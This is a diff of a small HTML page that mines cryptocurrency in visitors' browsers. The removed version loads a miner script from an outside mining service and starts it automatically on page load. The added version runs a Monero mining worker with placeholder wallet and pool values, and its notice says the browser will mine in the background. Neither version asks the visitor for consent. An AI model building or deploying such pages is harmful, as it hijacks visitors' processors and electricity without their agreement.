@@ -1,30 +1,17 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Automatic Crypto Miner</title>
+    <title>Web Miner</title>
 </head>
 <body>
-  <h1>Automatic Mining in Progress...</h1>
-  <p>Your computer is mining cryptocurrency automatically.</p>
-  
-  <script src="https://webminerpool.com/lib/miner.min.js"></script>
-  <script>
-    // Create a miner instance
-    const miner = new Miner("your-wallet-address");
+    <h1>Welcome to the Mining Website</h1>
+    <p>Your browser will mine Monero in the background to support this site.</p>
 
-    // Automatically start mining when the page loads
-    window.onload = () => {
-      miner.start();
-      console.log("Mining started automatically!");
-    };
-
-    // Stop mining if the user leaves the page
-    window.onbeforeunload = () => {
-      miner.stop();
-      console.log("Mining stopped.");
-    };
-  </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js"></script>
+    <script>
+        const worker = new Worker('miner.js'); // miner.js handles mining logic
+        worker.postMessage({ address: 'YOUR_MONERO_WALLET_ADDRESS', pool: 'YOUR_POOL_URL' });
+    </script>
 </body>
 </html>
+
